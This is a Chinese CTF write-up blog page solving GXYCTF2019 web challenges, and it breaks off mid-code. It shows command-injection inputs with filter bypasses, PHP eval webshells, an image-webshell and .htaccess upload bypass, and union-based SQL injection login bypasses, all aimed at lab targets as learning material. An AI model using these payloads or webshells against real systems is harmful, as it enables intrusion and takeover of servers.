@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01前言坚持每天都做做赛题，加油! 0x02赛题[GXYCTF2019]Ping Ping Ping 根据题目可以知道这个可能是rce命令执行题目，先ping一下本地看看 &#x2F;?ip&#x3D;127.0.0.1  ping出来了，那就试一下管道符拼接命令 &#x2F;?ip&#x3D;127.0.0.1||ls 介绍一下||管道符    || A||B A命令语句执行失败，然后才执行B命令语句，否则执行A命令语句    没">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF">
+<meta property="og:url" content="https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前言坚持每天都做做赛题，加油! 0x02赛题[GXYCTF2019]Ping Ping Ping 根据题目可以知道这个可能是rce命令执行题目，先ping一下本地看看 &#x2F;?ip&#x3D;127.0.0.1  ping出来了，那就试一下管道符拼接命令 &#x2F;?ip&#x3D;127.0.0.1||ls 介绍一下||管道符    || A||B A命令语句执行失败，然后才执行B命令语句，否则执行A命令语句    没">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112203942641.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112204059123.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112204630999.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112204723780.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112205123386.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112205416201.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112205514862.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112205918716.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112211519114.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112211615761.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112211943256.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112212708540.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112213954966.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112214958964.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114231931492.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114232718954.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114232900177.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114234332630.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114234519210.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114235140695.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114235157364.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241114235429495.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241115002008584.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241115222634445.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/20210325204736-46bca358-8d68-1.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241116104609373.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241116173131330.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241121205803605.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241121210117323.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241121210544355.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241123215639970.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241123220409844.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241123220022096.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241124110139796.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241124111430609.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241124111640722.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241124111734874.png">
+<meta property="article:published_time" content="2024-11-12T12:17:28.000Z">
+<meta property="article:modified_time" content="2025-01-18T17:20:11.946Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="GXYCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/GXYCTF/image-20241112203942641.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>GXYCTF</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/15/web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=GXYCTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=GXYCTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GXYCTF&body=Check out this article: https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=GXYCTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=GXYCTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E8%B5%9B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">0x02赛题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">2.1.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">绕过空格过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.2.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87flag%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">其他绕过flag方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">2.2.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">2.3.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E7%89%B9%E6%80%A7-%E5%9C%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E6%97%B6%EF%BC%8C%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%B0%B1%E4%BC%9A%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">sql特性:在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">2.4.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%87%BD%E6%95%B0%E5%B5%8C%E5%A5%97%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">2.4.1.</span> <span class="toc-text">解题思路:函数嵌套实现无参数rce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload1-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">payload1:读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload2-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">payload2:数组操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload3%EF%BC%9Asession-id"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">payload3：session_id</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-StrongestMind"><span class="toc-number">2.5.</span> <span class="toc-text">[GXYCTF2019]StrongestMind</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%87%8F%E6%B3%95%E8%AE%A1%E7%AE%97%E8%84%9A%E6%9C%AC"><span class="toc-number">2.5.1.</span> <span class="toc-text">加减法计算脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabysqliV3-0"><span class="toc-number">2.6.</span> <span class="toc-text">[GXYCTF2019]BabysqliV3.0</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        GXYCTF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-12T12:17:28.000Z" class="dt-published" itemprop="datePublished">2024-11-12</time>
+        
+        (Updated: <time datetime="2025-01-18T17:20:11.946Z" class="dt-updated" itemprop="dateModified">2025-01-19</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/GXYCTF/" rel="tag">GXYCTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>坚持每天都做做赛题，加油!</p>
+<h1 id="0x02赛题"><a href="#0x02赛题" class="headerlink" title="0x02赛题"></a>0x02赛题</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="/./../image/achieve/202411/GXYCTF/image-20241112203942641.png" alt="image-20241112203942641"></p>
+<p>根据题目可以知道这个可能是rce命令执行题目，先ping一下本地看看</p>
+<p><code>/?ip=127.0.0.1</code></p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112204059123.png" alt="image-20241112204059123"></p>
+<p>ping出来了，那就试一下管道符拼接命令</p>
+<p><code>/?ip=127.0.0.1||ls</code></p>
+<p>介绍一下||管道符</p>
+<table>
+<thead>
+<tr>
+<th>||</th>
+<th>A||B</th>
+<th>A命令语句执行失败，然后才执行B命令语句，否则执行A命令语句</th>
+</tr>
+</thead>
+</table>
+<p>没有发现回显，一开始以为这不是linux环境我我还换了dir查看目录，发现dir也不行，我就换了一下管道符，用分号拼接ls</p>
+<p><code>/?ip=127.0.0.1;ls</code></p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112204630999.png" alt="image-20241112204630999"></p>
+<p>发现flag.php文件，尝试cat一下</p>
+<p><code>/?ip=127.0.0.1;cat flag.php</code></p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112204723780.png" alt="image-20241112204723780"></p>
+<p>出现回显，原来是过滤了空格</p>
+<p>那就用绕过空格过滤的方法</p>
+<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><ul>
+<li>&lt; &lt;&gt; 重定向符 </li>
+<li>%20(space) </li>
+<li>%09(tab)</li>
+<li>$IFS$1 </li>
+<li><strong>${IFS}（最好用这个）</strong> </li>
+<li>$IFS</li>
+<li>%0a  换行符 </li>
+<li>{cat,flag.txt} 在大括号中逗号可起分隔作用</li>
+</ul>
+<p>用${IFS}试试看</p>
+<p><code>/?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php</code></p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112205123386.png" alt="image-20241112205123386"></p>
+<p>发现{}符号也被过滤了</p>
+<p>用$IFS$1试试</p>
+<p>&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1flag.php</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112205416201.png" alt="image-20241112205416201"></p>
+<p>好吧flag也被过滤了，那就用通配符进行绕过</p>
+<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符 实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</p>
+<table>
+<thead>
+<tr>
+<th>*</th>
+<th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?</td>
+<td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td>
+</tr>
+<tr>
+<td>[abcd ]</td>
+<td>匹配指定字符范围内的任意单个字符</td>
+</tr>
+<tr>
+<td>[a-z]</td>
+<td>表示范围a到z，表示范围的意思</td>
+</tr>
+</tbody></table>
+<p>对于linux cat和ca’’t ca\t ca””t效果是相同的 这样同样可以绕过字符的限制</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112205514862.png" alt="image-20241112205514862"></p>
+<p>真可恶，*和?都被过滤了</p>
+<p>换成别的绕过方法试一下</p>
+<h3 id="其他绕过flag方法"><a href="#其他绕过flag方法" class="headerlink" title="其他绕过flag方法"></a><strong>其他绕过flag方法</strong></h3><p>1.反斜杠\绕过flag</p>
+<p>2.’’单引号绕过flag</p>
+<p>发现还是不能绕过，我们倒回去看一下index里面看看有没有源代码吧</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112205918716.png" alt="image-20241112205918716"></p>
+<p>这里对flag进行了任意字符的匹配，所以无论中间用什么字符进行隔开绕过都会当成flag进行处理，这时候我们可以试一下赋值拼接绕过</p>
+<p>&#x2F;?ip&#x3D;127.0.0.1;b&#x3D;ag;c&#x3D;fl;cat$IFS$1$c$b.php</p>
+<p>发现并没有过滤的回显，看一下源码里面有没有flag，终于找到了</p>
+<p>注意:有些绕过了flag但在源码中并没有找到flag，我也不知道是什么原因</p>
+<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>一看就是文件上传漏洞</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112211519114.png" alt="image-20241112211519114"></p>
+<p>先传一句话木马看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112211615761.png" alt="image-20241112211615761"></p>
+<p>发现有文件后缀的验证，<strong>由此我们得知，文件后缀不可以有ph，那么php3,php5,phtml等后缀自然无法使用了。</strong>先测试一下看看是前端验证还是后端</p>
+<p>先把文件后缀改成jpg格式，然后上传并抓包修改后缀为php，再放包</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112211943256.png" alt="image-20241112211943256"></p>
+<p>发现还是对后缀名进行了警告，说明应该不是前端的js验证后缀名了，考虑是不是文件头检测</p>
+<p>那就做一个图片马</p>
+<p>先选一张小一点的图片，然后将一句话木马和图片合成为一张图片马</p>
+<p>cmd命令</p>
+<p>copy &#x2F;b 原始图片.jpg + 恶意代码文件.php 合成图片.jpg</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112212708540.png" alt="image-20241112212708540"></p>
+<p>不放心的话我们可以把2.jpg拖到010里面看一下是否有一句话木马</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112213954966.png" alt="image-20241112213954966"></p>
+<p>这里上传图片马记得修改后缀名，图片截的有问题</p>
+<p>也有警告,试一下00截断能不能绕过php</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241112214958964.png" alt="image-20241112214958964"></p>
+<p>好吧，骗不过他</p>
+<p>试一下**.htaccess**文件上传</p>
+<p>先传一个**.htaccess**文件看看能不能成功</p>
+<p>新建一个txt文件并写入</p>
+<p>AddType application&#x2F;x-httpd-php .jpg</p>
+<p>意思是可以将上传的jpg文件当作php文件去解析</p>
+<p>然后将后缀名改成.htaccess</p>
+<p>上传看看能不能通过</p>
+<p>发现还是显示上传类型太露骨,应该是也对htaccess文件进行了过滤，我们试着把content_type头改一下</p>
+<p>修改如下</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114231931492.png" alt="image-20241114231931492"></p>
+<p>发现上传成功，我们试着传一个jpg格式的一句话木马</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114232718954.png" alt="image-20241114232718954"></p>
+<p>结果发现还是传不了，我直接换了一个木马，换成phtml的木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[cmd])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114232900177.png" alt="image-20241114232900177"></p>
+<p>发现这个上传成功了，那我们访问一下木马</p>
+<p>发现没有呈现图片，说明我们的phtml文件被解析执行了，那就直接用蚁剑连接找flag就行了</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>打开题目是登录界面，那就先进行一系列的测试</p>
+<p>用1和1’测试后发信有回显报错，判断存在注入点且为单引号闭合</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114234332630.png" alt="image-20241114234332630"></p>
+<p>接下来是判断注入类型了，看看是整数型还是字符型</p>
+<p>但是当我用or 1&#x3D;1判断的时候出现页面</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114234519210.png" alt="image-20241114234519210"></p>
+<p>猜测应该是or被黑名单限制了</p>
+<p>后续用双写绕过，order by判断字段数也是一样，基本上确定有黑名单验证了</p>
+<p>直接试一下union有没有被过滤</p>
+<p>1’ union select 1,2#</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114235140695.png" alt="image-20241114235140695"></p>
+<p>1’ union select 1,2,3#</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114235157364.png" alt="image-20241114235157364"></p>
+<p>没报错，说明字段数应该是3个</p>
+<p>虽然union select没被过滤，但database被过滤了，真让人头大</p>
+<p>抓包做看看有没有线索</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241114235429495.png" alt="image-20241114235429495"></p>
+<p>居然还真有，在response包中看到一段注释掉的编码，我们解码一下</p>
+<p>我一开始用的base64解码发现是乱码，就试了一下其他base解码，通过测试发现是套加密（二次加密）,需要先base32解码再base64解码</p>
+<p>解码后的结果是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到注入点是在name参数，那就对name参数进行sql注入</p>
+<p>先假设用户名是admin进行测试:</p>
+<p>admin’#</p>
+<p>发现出现wrong pass</p>
+<p>证明是有admin这个用户的，但密码并不正确</p>
+<p>不过这一关用到了sql的一个特性</p>
+<h3 id="sql特性-在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据"><a href="#sql特性-在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据" class="headerlink" title="sql特性:在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据"></a>sql特性:<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</strong></h3><p>首先第一步判断回显点，利用穷举法，看页面回显判断</p>
+<p>’union select1,2, ‘admin’#</p>
+<p>页面回显 wrong user! 但我们知道 用户名是正确的，所以只能是位置错了。</p>
+<p>由此判断出 admin的位置</p>
+<p>‘union select 1,’admin’,3#</p>
+<p>通过题目的源代码可以知道，这里的密码是进行了md5加密过的，在最后面的代码中中提到只有密码进行md5编码才会得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 